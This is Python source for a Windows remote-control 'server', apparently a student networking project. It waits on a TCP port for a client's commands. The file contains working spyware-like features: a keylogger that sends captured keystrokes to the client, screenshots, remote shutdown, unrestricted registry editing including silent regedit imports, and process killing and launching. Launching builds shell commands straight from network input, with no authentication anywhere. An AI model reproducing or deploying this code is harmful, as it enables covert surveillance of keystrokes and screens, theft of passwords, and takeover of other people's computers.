import tkinter as tk
import socket, pickle, PIL.ImageGrab, psutil, struct
import os, json, re, winreg, threading, subprocess
import numpy as np
from pynput.keyboard import Listener 

main = tk.Tk()
main.geometry("200x200")
main.title("Server")

#Global variables
###############################################################################
global client
BUFSIZ = 1024 * 4
WIDTH = 1900
HEIGHT = 1000
###############################################################################
#Send data
###############################################################################
def SendData(data):
    global client
    size = struct.pack('!I', len(data))
    data = size + data
    client.sendall(data)
    return
###############################################################################

#KeyLogger
###############################################################################
def Keylogger(key):
    global cont, flag
    if flag == 3:
        return False
    if flag == 1:
        #cont = np.append(cont, key)
        cont += str(key)
    return
        
def Print():
    global client, cont
    client.sendall(bytes(cont, "utf8"))
    cont = " "
    return
    
def Listen():
    with Listener(on_press = Keylogger) as listener:
        listener.join()  
    return
        
def KeyLog():
    global cont, client, flag
    threading.Thread(target = Listen).start() 
    flag = 0
    cont = " "
    msg = ""
    while True:
        msg = client.recv(BUFSIZ).decode("utf8")
        if "HOOK" in msg:
            flag = 1
        elif "UN" in msg:
            flag = 2
        elif "PRINT" in msg:
            Print()
        elif "QUIT" in msg:
            flag = 3
            return    
    return                    
###############################################################################

#Shutdown
###############################################################################
def ShutDown():
    os.system('shutdown -s -t 15')
    return
###############################################################################

#Registry
###############################################################################
def parse_data(full_path):
    full_path = re.sub(r'/', r'\\', full_path)
    hive = re.sub(r'\\.*$', '', full_path)
    if not hive:
        raise ValueError('Invalid \'full_path\' param.')
    if len(hive) <= 4:
        if hive == 'HKLM':
            hive = 'HKEY_LOCAL_MACHINE'
        elif hive == 'HKCU':
            hive = 'HKEY_CURRENT_USER'
        elif hive == 'HKCR':
            hive = 'HKEY_CLASSES_ROOT'
        elif hive == 'HKU':
            hive = 'HKEY_USERS'
    reg_key = re.sub(r'^[A-Z_]*\\', '', full_path)
    reg_key = re.sub(r'\\[^\\]+$', '', reg_key)
    reg_value = re.sub(r'^.*\\', '', full_path)

    return hive, reg_key, reg_value

def query_value(full_path):
    value_list = parse_data(full_path)
    try:
        opened_key = winreg.OpenKey(getattr(winreg, value_list[0]), value_list[1], 0, winreg.KEY_READ)
        winreg.QueryValueEx(opened_key, value_list[2])
        winreg.CloseKey(opened_key)
        return ["1", "1"]
    except WindowsError:
        return ["0", "0"]


def get_value(full_path):
    value_list = parse_data(full_path)
    try:
        opened_key = winreg.OpenKey(getattr(winreg, value_list[0]), value_list[1], 0, winreg.KEY_READ)
        value_of_value, value_type = winreg.QueryValueEx(opened_key, value_list[2])
        winreg.CloseKey(opened_key)
        return ["1", value_of_value]
    except WindowsError:
        return ["0", "0"]


def set_value(full_path, value, value_type='REG_SZ'):
    value_list = parse_data(full_path)
    try:
        winreg.CreateKey(getattr(winreg, value_list[0]), value_list[1])
        opened_key = winreg.OpenKey(getattr(winreg, value_list[0]), value_list[1], 0, winreg.KEY_WRITE)
        winreg.SetValueEx(opened_key, value_list[2], 0, getattr(winreg, value_type), value)
        winreg.CloseKey(opened_key)
        return ["1", "1"]
    except WindowsError:
        return ["0", "0"]


def delete_value(full_path):
    value_list = parse_data(full_path)
    try:
        opened_key = winreg.OpenKey(getattr(winreg, value_list[0]), value_list[1], 0, winreg.KEY_WRITE)
        winreg.DeleteValue(opened_key, value_list[2])
        winreg.CloseKey(opened_key)
        return ["1", "1"]
    except WindowsError:
        return ["0", "0"]


def query_key(full_path):
    value_list = parse_data(full_path)
    try:
        opened_key = winreg.OpenKey(getattr(winreg, value_list[0]), value_list[1] + r'\\' + value_list[2], 0, winreg.KEY_READ)
        winreg.CloseKey(opened_key)
        return ["1", "1"]
    except WindowsError:
        return ["0", "0"]


def create_key(full_path):
    value_list = parse_data(full_path)
    try:
        winreg.CreateKey(getattr(winreg, value_list[0]), value_list[1])
        return ["1", "1"]
    except WindowsError:
        return ["0", "0"]


def delete_key(full_path):
    value_list = parse_data(full_path)
    try:
        winreg.DeleteKey(getattr(winreg, value_list[0]), value_list[1] + r'\\' + value_list[2])
        return ["1", "1"]
    except WindowsError:
        return ["0", "0"]

def Registry():
    global client
    while True:
        msg = client.recv(BUFSIZ).decode("utf8")
        if "QUIT" in msg and len(msg) < 20:
            return
        msg = json.loads(msg)
        ID = msg['ID']
        full_path = msg['path'] 
        name_value = msg['name_value']
        value = msg['value']
        v_type = msg['v_type']
        res = ['0','0']
        #ID==0 run file.reg
        #path is detail of file .reg
        if ID == 0:
            try:
                outout_file = 'run.reg'
                with open(outout_file, 'r+') as f:
                    f.write(full_path);
                    f.close()
                os.system(r'regedit /s ' + os.getcwd() + '/run.reg')
                res = ["1", "1"]
            except:
                res = ["0", "0"]
        #ID==1 get_value
        elif ID == 1:
            res = get_value(full_path + r'\\' + name_value)     
        #ID==2 set_value
        elif ID == 2:
            res = set_value(full_path + r'\\' + name_value, value, v_type)
        #ID==3 delete value
        elif ID == 3:
            res = delete_value(full_path + r'\\' + name_value)
        
        #ID==4 create key
        elif ID == 4:
            res = create_key(full_path)
        elif ID == 5:
            res = delete_key(full_path + r'\\')
        client.sendall(bytes(res[0], "utf8"))
        client.sendall(bytes(str(res[1]), "utf8"))
    return
###############################################################################
    
#TakePic
###############################################################################                      
def TakePic():
    global client
    while True:
        msg = client.recv(BUFSIZ).decode("utf8")
        if "TAKE" in msg:
            im = PIL.ImageGrab.grab()
            im_string = pickle.dumps(np.array(im))
            SendData(im_string)
        if "QUIT" in msg:
            return 
    return
###############################################################################
    
#Process Running
###############################################################################
def list_process():
    ls1 = list()
    ls2 = list()
    ls3 = list()
    for proc in psutil.process_iter():
        try:
            # Get process name & pid from process object.
            name = proc.name()
            pid = proc.pid
            threads = proc.num_threads()
            ls1.append(str(name))
            ls2.append(str(pid))
            ls3.append(str(threads))
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return ls1, ls2, ls3

def kill_process(pid):
    cmd = 'taskkill.exe /F /PID ' + str(pid)
    try:
        a = os.system(cmd)
        if a == 0:
            return 1
        else:
            return 0
    except:
        return 0


def start_process(process_name):
    cmd = 'start ' + str(process_name)
    try:
        a = os.system(cmd)
        if a == 0:
            return 1
        else:
            return 0
    except:
        return 0
def Process():
    global msg, client, BUFSIZ
    while True:
        msg = client.recv(BUFSIZ).decode("utf8")
        if "QUIT" in msg and len(msg) < 20:
            return
        res = 0
        ls1 = list()
        ls2 = list()
        ls3 = list()
        action = int(msg)
        #0-kill
        if action == 0:
            pid = client.recv(BUFSIZ).decode("utf8")
            pid = int(pid)
            try:
                res = kill_process(pid)
            except:
                res = 0
        #1-xem
        elif action == 1:
            try:
                ls1, ls2, ls3 = list_process()
                res = 1
            except:
                res = 0
        #2-xoa
        elif action == 2:
            res = 1
        #3-start
        elif action == 3:
            pname = client.recv(BUFSIZ).decode("utf8")
            try:
                res = start_process(pname)
            except:
                res = 0
        if action != 1:
            client.sendall(bytes(str(res), "utf8"))
        if action == 1:
            ls1 = pickle.dumps(ls1)
            ls2 = pickle.dumps(ls2)
            ls3 = pickle.dumps(ls3)
            SendData(ls1)
            #print("")
            SendData(ls2)
            #print("")
            SendData(ls3)
    return
###############################################################################

#App Running
###############################################################################
def list_apps():
    app_name = list()
    app_id = list()
    app_threads = list()
    tmp = list()
    cmd = 'powershell "gps | Where-Object {$_.mainWindowTitle} | select Description, ID, @{Name=\'ThreadCount\';Expression ={$_.Threads.Count}}'
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
    for line in proc.stdout:
        if not line.decode()[0].isspace():
            s = line.decode().rstrip()
            tmp.append(s)
    tmp = tmp[2:]
    for line in tmp:
        arr = line.split(" ")
        name = arr[0]
        ID = 0
        threads = arr[-1]
        # interation
        cur = 1
        for i in range (1, len(arr)):
            if len(arr[i]) != 0:
                name += ' ' + arr[i]
            else:
                cur = i + 1
                break
        for i in range (cur, len(arr)):
            if len(arr[i]) != 0:
                ID = arr[i]
                break
            
        app_name.append(name)
        app_id.append(ID)
        app_threads.append(threads)
        
    return app_name, app_id, app_threads

def kill_app(pid):
    cmd = 'taskkill.exe /F /PID ' + str(pid)
    try:
        a = os.system(cmd)
        if a == 0:
            return 1
        else:
            return 0
    except:
        return 0
    
def start_app(app_name):
    cmd = 'start ' + str(app_name)
    try:
        a = os.system(cmd)
        if a == 0:
            return 1
        else:
            return 0
    except:
        return 0
    
def Application():
    global msg, client, BUFSIZ
    while True:
        msg = client.recv(BUFSIZ).decode("utf8")
        if "QUIT" in msg and len(msg) < 20:
            return
        res = 0
        ls1 = list()
        ls2 = list()
        ls3 = list()
        action = int(msg)
        #0-kill
        if action == 0:
            print("Killing")
            pid = client.recv(BUFSIZ).decode("utf8")
            pid = int(pid)
            try:
                res = kill_app(pid)
            except:
                res = 0
        #1-xem
        elif action == 1:
            try:
                ls1, ls2, ls3 = list_apps()
                res = 1
            except:
                res = 0
        #2-xoa
        elif action == 2:
            res = 1
        #3-start
        elif action == 3:
            pname = client.recv(BUFSIZ).decode("utf8")
            try:
                res = start_app(pname)
            except:
                res = 0
            print("Start app " + pname)
            
        if action != 1:            
            client.sendall(bytes(str(res), "utf8"))
            print("action = " + str(action) + " res = " + str(res))
        if action == 1:
            ls1 = pickle.dumps(ls1)
            ls2 = pickle.dumps(ls2)
            ls3 = pickle.dumps(ls3)
            SendData(ls1)
            #print("")
            SendData(ls2)
            #print("")
            SendData(ls3)
    return
###############################################################################

#Connect
###############################################################################           
def Connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = ''
    port = 5656
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((host, port))
    s.listen(100)
    global client
    client, addr = s.accept()
    while True:
        msg = client.recv(BUFSIZ).decode("utf8")
        if "KEYLOG" in msg:
            KeyLog()
        elif "SHUTDOWN" in msg:
            ShutDown()
        elif "REGISTRY" in msg:
            Registry()
        elif "TAKEPIC" in msg:
            TakePic()
        elif "PROCESS" in msg:
            Process()
        elif "APPLICATION" in msg:
            Application()
        elif "QUIT" in msg:
            client.close()
            s.close()
            return
###############################################################################    

tk.Button(main, text = "Open", command = Connect).place(x = 100, y = 100, anchor = "center")

main.mainloop()


